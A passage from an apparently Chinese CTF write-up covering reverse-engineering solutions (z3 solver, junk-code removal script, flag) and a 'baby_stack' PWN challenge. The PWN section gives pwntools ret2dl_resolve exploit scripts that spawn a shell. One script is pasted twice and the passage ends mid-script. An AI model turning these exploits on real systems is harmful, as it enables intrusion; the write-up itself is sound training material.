class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 –*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#定义变量</span></span><br><span class=\"line\"></span><br><span class=\"line\">a = Int(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">b = Int(<span class=\"string\">'b'</span>)</span><br><span class=\"line\">c = Int(<span class=\"string\">'c'</span>)</span><br><span class=\"line\">d = Int(<span class=\"string\">'d'</span>)</span><br><span class=\"line\">e = Int(<span class=\"string\">'e'</span>)</span><br><span class=\"line\">f = Int(<span class=\"string\">'f'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">m = Int(<span class=\"string\">'m'</span>)</span><br><span class=\"line\">n = Int(<span class=\"string\">'n'</span>)</span><br><span class=\"line\">p = Int(<span class=\"string\">'p'</span>)</span><br><span class=\"line\">q = Int(<span class=\"string\">'q'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">solver = Solver()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置变量范围</span></span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(a &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(b &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(a &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\">solver.add(b &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\">solver.add(c &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(d &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(c &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\">solver.add(d &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(e &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(f &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(e &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\">solver.add(f &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(m &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(n &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(m &lt; <span class=\"number\">0xffffffff</span>)</span><br><span class=\"line\">solver.add(n &lt; <span class=\"number\">0xffffffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置表达式</span></span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(a*b == <span class=\"number\">0x146E4C25</span>)</span><br><span class=\"line\">solver.add(a+b == <span class=\"number\">0x9a66</span>)</span><br><span class=\"line\">solver.add(c*d == <span class=\"number\">0xa3a4e22</span>)</span><br><span class=\"line\">solver.add(c+d == <span class=\"number\">0x666b</span>)</span><br><span class=\"line\">solver.add(e*f == <span class=\"number\">0x166dfcb4</span>)</span><br><span class=\"line\">solver.add(e+f == <span class=\"number\">0x9d95</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(m-n == <span class=\"number\">0x3BF1F3FD</span>)</span><br><span class=\"line\">solver.add(m%<span class=\"number\">0x10000</span> +m/<span class=\"number\">0x10000</span> ==<span class=\"number\">0xDBCD</span>)</span><br><span class=\"line\">solver.add(n%<span class=\"number\">0x10000</span> -n/<span class=\"number\">0x10000</span> ==<span class=\"number\">0x3AF4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#获取结果</span></span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">\"solving...\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(solver.check()==sat):</span><br><span class=\"line\">  <span class=\"keyword\">print</span> solver.model()</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>又拍苍蝇</strong><br>本题修改自山东省赛拍苍蝇，大大降低了难度，只需要将苍蝇拍完毕即可得到Flag。每个苍蝇中包含了一个secret值，当苍蝇被拍死的时候（对话框销毁的时候），才会初始化这个secret值，所以就算定位到了苍蝇是否死活的标志位进行强制修改也无效，当拍死的苍蝇数量达到24只的时候，会依次计算每个苍蝇携带的secret值，跟一个全局变量循环右移索引位，然后异或，然后根据索引从这个dowrd中取一位放到flag中。由于添加的花指令，所以需要先去除之后才方便分析，花指令特征</li>\n</ul>\n<p><code>EB14EA50EB0BEA8BC4A8017406EB0BEA??660FD64424EBEBEEEA4C58</code></p>\n<p>脚本如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">VAR CodeBase</span><br><span class=\"line\">VAR CodeSize</span><br><span class=\"line\"></span><br><span class=\"line\">BPHWCALL</span><br><span class=\"line\">BPHWC</span><br><span class=\"line\">BC</span><br><span class=\"line\"></span><br><span class=\"line\">GMI eip, CODEBASE</span><br><span class=\"line\">MOV CodeBase,$RESULT</span><br><span class=\"line\">GMI eip, CODESIZE</span><br><span class=\"line\">MOV CodeSize,$RESULT</span><br><span class=\"line\"></span><br><span class=\"line\">var junk_addr</span><br><span class=\"line\"></span><br><span class=\"line\">lab_find:</span><br><span class=\"line\">find CodeBase,#EB14EA50EB0BEA8BC4A8017406EB0BEA??660FD64424EBEBEEEA4C58#,CodeSize</span><br><span class=\"line\">mov junk_addr,$RESULT</span><br><span class=\"line\">cmp junk_addr,0</span><br><span class=\"line\">jz exit</span><br><span class=\"line\">MOV [junk_addr],#90909090909090909090909090909090909090909090909090909090#</span><br><span class=\"line\">jmp lab_find</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">exit:</span><br><span class=\"line\">RET</span><br></pre></td></tr></table></figure>\n<p>之后od就清晰了，根据success字符串定位到关键地方,cl是索引</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012D30CD                      B8 775F123C     mov eax,0x3C125F77</span><br><span class=\"line\">012D30D2                      D3C8            ror eax,cl</span><br><span class=\"line\">012D30D4                      3382 E0000000   xor eax,dword ptr ds:[edx+0xE0]</span><br><span class=\"line\">012D30DA                      8985 6CFFFFFF   mov dword ptr ss:[ebp-0x94],eax</span><br><span class=\"line\">012D30E0                      90              nop</span><br><span class=\"line\"></span><br><span class=\"line\">012D3118                      8BC1            mov eax,ecx</span><br><span class=\"line\">012D311A                      25 03000080     and eax,0x80000003</span><br><span class=\"line\">012D311F                      79 05           jns short Fly.012D3126</span><br><span class=\"line\">012D3121                      48              dec eax</span><br><span class=\"line\">012D3122                      83C8 FC         or eax,0xFFFFFFFC</span><br><span class=\"line\">012D3125                      40              inc eax</span><br><span class=\"line\">012D3126                      8A8405 6CFFFFFF mov al,byte ptr ss:[ebp+eax-0x94]</span><br><span class=\"line\">012D312D                      88840D 70FFFFFF mov byte ptr ss:[ebp+ecx-0x90],al</span><br></pre></td></tr></table></figure>\n<p>定位初始secret的地方</p>\n<p>借助xspy定位消息响应函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Message map: 0x0058880C (Fly3.exe+ 0x18880c )</span><br><span class=\"line\">Message map entries: 0x00588818 (Fly3.exe+ 0x188818 )</span><br><span class=\"line\">OnMsg:WM_TIMER(0113),func= 0x00404E30 (Fly3.exe+ 0x004e30 )</span><br><span class=\"line\">OnMsg:WM_LBUTTONDOWN(0201),func= 0x00405150 (Fly3.exe+ 0x005150 )</span><br><span class=\"line\">OnMsg:WM_LBUTTONUP(0202),func= 0x004051D0 (Fly3.exe+ 0x0051d0 )</span><br><span class=\"line\">OnMsg:WM_MOUSEHOVER(02a1),func= 0x004051E0 (Fly3.exe+ 0x0051e0 )</span><br><span class=\"line\">OnMsg:WM_MOUSELEAVE(02a3),func= 0x00405200 (Fly3.exe+ 0x005200 )</span><br><span class=\"line\">OnMsg:WM_MOUSEMOVE(0200),func= 0x00405220 (Fly3.exe+ 0x005220 )</span><br><span class=\"line\">OnMsg:WM_LBUTTONDBLCLK(0203),func= 0x004051D0 (Fly3.exe+ 0x0051d0 )</span><br></pre></td></tr></table></figure>\n<p>定位到数组dwKey</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void __thiscall CFlyWnd::OnLButtonDown(CFlyWnd *this, unsigned int nFlags, CPoint point)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  CFlyWnd *v3; // esi</span><br><span class=\"line\">  int v4; // eax</span><br><span class=\"line\">  char szOut[100]; // [esp+4h] [ebp-68h]</span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = this;</span><br><span class=\"line\">  szOut[0] = 0;</span><br><span class=\"line\">  v4 = this-&gt;nIndex;</span><br><span class=\"line\">  this-&gt;is_death = 1;</span><br><span class=\"line\">  this-&gt;secret = dwKey[v4];</span><br><span class=\"line\">  memset(&amp;szOut[1], 0, 0x63u);</span><br><span class=\"line\">  _wsprintfA(szOut, &quot;fly death  %d&quot;, 1);</span><br><span class=\"line\">  PostMessageW(v3-&gt;m_hWnd, 0x10u, 0, 0);</span><br><span class=\"line\">  CWnd::Default((CWnd *)&amp;v3-&gt;vfptr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD dwXorKey = 0x3c125f77;</span><br><span class=\"line\">  DWORD dwKey[100] = &#123; 0x59206b45, 0xfa6d1fde, 0xaa30f5ec, 0x81b4728a, 0x43a213cf, 0x8c85f3cc, 0xe8922b1c, 0xdf191586, 0x4158266a, 0xdfac3b1c, 0xb9ae65f1, 0xde83b273, 0x914ba440, 0xcb8ed8f4, 0x4beac32d, 0x8cd64e10, 0x6b120c25, 0x498df831, 0xa2b9f93d, 0x79d6d0e4, 0x47c640f0, 0xa0c3dbd6, 0x7b4def96, 0x158e8c4d &#125;;</span><br><span class=\"line\">  char szResult[100] = &#123; 0 &#125;;</span><br><span class=\"line\">  for (int i = 0; i &lt; 24; i++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    DWORD dwTmp = dwKey[i] ^ CROR(dwXorKey, i);</span><br><span class=\"line\">    </span><br><span class=\"line\">    szResult[i] = (PBYTE(&amp;dwTmp))[i % 4];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printf(szResult);</span><br></pre></td></tr></table></figure>\n<p>得到flag:204f8ab152a0e8627fd21b01</p>\n<p>本题可以不去进项算法分析，直接模拟点击点掉所有苍蝇即可。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">BOOL CALLBACK <span class=\"title\">EnumWindowProc</span><span class=\"params\">(HWND hWnd, LPARAM lParam)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> szClassName[<span class=\"number\">100</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">  GetClassName(hWnd, szClassName, <span class=\"number\">100</span>);</span><br><span class=\"line\">  RECT m_rect;</span><br><span class=\"line\">  GetWindowRect(hWnd, &amp;m_rect);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(<span class=\"string\">\"#32770\"</span>, szClassName) == <span class=\"number\">0</span> &amp;&amp; m_rect.bottom - m_rect.top == <span class=\"number\">60</span> &amp;&amp; m_rect.right - m_rect.left == <span class=\"number\">60</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    SendMessage(hWnd, WM_LBUTTONDOWN, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">//在某个函数里面调用  </span></span><br><span class=\"line\">  EnumWindows(EnumWindowProc, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">  Sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a><strong>PWN</strong></h2><ul>\n<li><strong>baby_stack</strong></li>\n<li>没有输出无法leak，没有提供libc，有溢出，考虑ret2dl_resolve</li>\n<li>可以手组结构，仿造roputils写ret2dl_resolve函数</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding=utf8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">'./babystack'</span>)</span><br><span class=\"line\">binary = ELF(<span class=\"string\">'./babystack'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ret2dl_resolve</span><span class=\"params\">(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=<span class=\"number\">1</span>)</span>:</span></span><br><span class=\"line\">    jmprel = ELF_obj.dynamic_value_by_tag(<span class=\"string\">\"DT_JMPREL\"</span>)<span class=\"comment\">#rel_plt</span></span><br><span class=\"line\">    relent = ELF_obj.dynamic_value_by_tag(<span class=\"string\">\"DT_RELENT\"</span>)</span><br><span class=\"line\">    symtab = ELF_obj.dynamic_value_by_tag(<span class=\"string\">\"DT_SYMTAB\"</span>)<span class=\"comment\">#dynsym</span></span><br><span class=\"line\">    syment = ELF_obj.dynamic_value_by_tag(<span class=\"string\">\"DT_SYMENT\"</span>)</span><br><span class=\"line\">    strtab = ELF_obj.dynamic_value_by_tag(<span class=\"string\">\"DT_STRTAB\"</span>)<span class=\"comment\">#dynstr</span></span><br><span class=\"line\">    versym = ELF_obj.dynamic_value_by_tag(<span class=\"string\">\"DT_VERSYM\"</span>)<span class=\"comment\">#version</span></span><br><span class=\"line\">    plt0 = ELF_obj.get_section_by_name(<span class=\"string\">'.plt'</span>).header.sh_addr</span><br><span class=\"line\"></span><br><span class=\"line\">    p_name = fake_stage+<span class=\"number\">8</span>-strtab</span><br><span class=\"line\">    len_bypass_version = <span class=\"number\">8</span>-(len(func_name)+<span class=\"number\">1</span>)%<span class=\"number\">0x8</span></span><br><span class=\"line\">    sym_addr_offset = fake_stage+<span class=\"number\">8</span>+(len(func_name)+<span class=\"number\">1</span>)+len_bypass_version-symtab</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> sym_addr_offset%<span class=\"number\">0x10</span> != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> sym_addr_offset%<span class=\"number\">0x10</span> == <span class=\"number\">8</span>:</span><br><span class=\"line\">            len_bypass_version+=<span class=\"number\">8</span></span><br><span class=\"line\">            sym_addr_offset = fake_stage+<span class=\"number\">8</span>+(len(func_name)+<span class=\"number\">1</span>)+len_bypass_version-symtab</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            error(<span class=\"string\">'something error!'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    fake_sym = sym_addr_offset/<span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</span><br><span class=\"line\">        fake_ndx = u16(ELF_obj.read(versym+fake_sym*<span class=\"number\">2</span>,<span class=\"number\">2</span>))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> fake_ndx != <span class=\"number\">0</span>:</span><br><span class=\"line\">            fake_sym+=<span class=\"number\">1</span></span><br><span class=\"line\">            len_bypass_version+=<span class=\"number\">0x10</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> do_slim:</span><br><span class=\"line\">        slim = len_bypass_version - len_bypass_version%<span class=\"number\">8</span></span><br><span class=\"line\">        version = len_bypass_version%<span class=\"number\">8</span></span><br><span class=\"line\">        resolve_data,resolve_call=ret2dl_resolve(ELF_obj,func_name,resolve_addr,fake_stage+slim,<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (resolve_data,resolve_call,fake_stage+slim)</span><br><span class=\"line\"></span><br><span class=\"line\">    fake_r_info = fake_sym&lt;&lt;<span class=\"number\">8</span>|<span class=\"number\">0x7</span></span><br><span class=\"line\">    reloc_offset=fake_stage-jmprel</span><br><span class=\"line\"></span><br><span class=\"line\">    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+<span class=\"string\">'\\x00'</span></span><br><span class=\"line\">    resolve_data += <span class=\"string\">'a'</span>*len_bypass_version</span><br><span class=\"line\">    resolve_data += p32(p_name)+p32(<span class=\"number\">0</span>)+p32(<span class=\"number\">0</span>)+p32(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    resolve_call = p32(plt0)+p32(reloc_offset)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (resolve_data,resolve_call)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x4c</span></span><br><span class=\"line\">stage = binary.bss()</span><br><span class=\"line\">p_ebx_ret = <span class=\"number\">0x080482c9</span></span><br><span class=\"line\">p3ret = <span class=\"number\">0x080484a9</span></span><br><span class=\"line\"></span><br><span class=\"line\">dl_data,dl_call,stage = ret2dl_resolve(binary,<span class=\"string\">'system'</span>,binary.bss()+<span class=\"number\">0x200</span>,stage)</span><br><span class=\"line\"></span><br><span class=\"line\">pay = <span class=\"string\">'a'</span>*offset</span><br><span class=\"line\">pay += p32(binary.plt[<span class=\"string\">'read'</span>])+p32(p3ret)+p32(<span class=\"number\">0</span>)+p32(stage)+p32(len(dl_data)+<span class=\"number\">8</span>)   <span class=\"comment\">#读40个字节到base_stage</span></span><br><span class=\"line\">pay += dl_call  </span><br><span class=\"line\">pay += p32(p_ebx_ret)+p32(stage+len(dl_data)) </span><br><span class=\"line\"><span class=\"comment\">#伪造条目</span></span><br><span class=\"line\">p.sendline(pay)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.send(dl_data+<span class=\"string\">'/bin/sh\\x00'</span>)</span><br><span class=\"line\"><span class=\"comment\">#调用system</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>也可用roputils简化脚本</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> roputils</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = 'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./baby_stack\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./baby_stack\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">rop = roputils.ROP(<span class=\"string\">'./baby_stack'</span>)</span><br><span class=\"line\">stage = rop.section(<span class=\"string\">'.bss'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x4c</span></span><br><span class=\"line\">vulFunc = <span class=\"number\">0x804840b</span></span><br><span class=\"line\"></span><br><span class=\"line\">buf1 = <span class=\"string\">'A'</span> * offset</span><br><span class=\"line\">buf1 += p32(elf.symbols[<span class=\"string\">'read'</span>]) + p32(vulFunc) + p32(<span class=\"number\">0</span>) + p32(stage) + p32(<span class=\"number\">100</span>)    </span><br><span class=\"line\">p.send(buf1)</span><br><span class=\"line\"></span><br><span class=\"line\">buf2 = rop.string(<span class=\"string\">'/bin/sh'</span>)</span><br><span class=\"line\">buf2 += rop.fill(<span class=\"number\">20</span>, buf2)</span><br><span class=\"line\">buf2 += rop.dl_resolve_data(stage+<span class=\"number\">20</span>, <span class=\"string\">'system'</span>)</span><br><span class=\"line\">buf2 += rop.fill(<span class=\"number\">100</span>, buf2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(buf2)</span><br><span class=\"line\"></span><br><span class=\"line\">buf3 = <span class=\"string\">\"A\"</span>*offset + rop.dl_resolve_call(stage+<span class=\"number\">20</span>,stage)</span><br><span class=\"line\">p.send(buf3)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()<span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> roputils</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = 'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = 